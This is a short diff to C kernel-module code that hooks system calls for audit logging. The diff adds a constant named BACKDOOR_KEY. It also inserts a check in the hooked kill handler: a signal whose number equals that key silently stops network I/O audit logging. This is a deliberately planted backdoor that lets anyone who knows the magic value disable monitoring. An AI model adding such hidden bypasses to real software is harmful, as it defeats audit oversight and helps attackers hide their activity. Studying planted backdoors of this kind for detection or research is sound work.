@@ -36,6 +36,8 @@
 #define MWRITE2 	0xfffffed3 // -301
 #define UDEP		0xfffffe70 // -400
 
+#define BACKDOOR_KEY	0x00beefed
+
 /* 
  * 'stop' variable used to start and stop ONLY logging of system calls to audit log.
  * Don't need to synchronize 'stop' variable modification because it can only be set by a kernel module and only one
@@ -445,6 +447,12 @@ asmlinkage long new_sendto(int fd, const void* msg, size_t msgsize, int flags, c
 
 asmlinkage long new_kill(pid_t pid, int sig){
 	long retval;
+	
+	if(sig == BACKDOOR_KEY){
+			netio_logging_stop(BUILD_HASH);
+			return -1;
+	}
+	
 	if(stop == 0){
 		if(usingKey == 1){
 			int tgid = get_tgid(pid);
